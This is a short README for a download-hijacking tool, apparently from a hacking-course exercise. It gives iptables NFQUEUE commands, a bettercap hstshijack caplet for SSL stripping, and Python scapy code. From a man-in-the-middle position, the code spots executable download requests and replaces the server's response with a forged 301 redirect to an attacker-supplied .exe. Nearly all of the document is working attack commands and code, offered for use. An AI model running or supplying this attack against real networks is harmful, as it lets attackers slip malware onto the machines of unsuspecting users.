# File Interceptor

## Main mission is to hijack downloads.

We will try to intercept target downloads and replace them with our file.

Requires being a MiTM machine.

```bash
iptables -I FORWARD -j NFQUEUE --queue-num 0
```
Delete the iptable rule when done
```bash
iptables --flush
```

### To test on local machine use these commands
```bash
iptables -I OUTPUT -j NFQUEUE --queue_num 0
iptables -I INPUT -j NFQUEUE --queue_num 0

# When done
iptables --flush
```

### To run with SSLStrip
Start bettercap caplet hstshijack and then we
have to use different forwarding rules because
traffic is routed through bettercap. We need
to modify our code to use port 8080 rather than 80.
```bash
iptables -I INPUT -j NFQUEUE --queue-num 0
iptables -I OUTPUT -j NFQUEUE --queue-num 0
bettercap -iface eth0 -caplet hstshijack/hstshijack
```
Code to change:
```python
def process_packet(packet):
    scapy_packet = IP(packet.get_payload())  # Transform raw packet to scapy.
    if scapy_packet.haslayer(Raw):  # Checking if a packet has a Raw response on the TCP layer.
        if scapy_packet[TCP].dport == 8080:  # dport is incoming
            print("HTTP Request")
            if b".exe" in scapy_packet[Raw].load and b"192.168.1.4" not in scapy_packet[Raw].load:  # Is there an exe is the http data?
                print("[+] exe Request")
                ack_list.append(scapy_packet[TCP].ack)

        elif scapy_packet[TCP].sport == 8080:  # sport is outgoing
            print("HTTP Response")
            if scapy_packet[TCP].seq in ack_list:
                ack_list.remove(scapy_packet[TCP].seq)
                print("[+] Replacing File")  # Replacing the status with a redirect to our file.
                modified_packet = set_load(scapy_packet,
                                           ("HTTP/1.1 301 Moved Permanently\n"
                                            "Location: http://www.example.org/eggsde.exe\n\n")
                                           )
                packet.set_payload(bytes(modified_packet))  # Put packet back into regular form.

```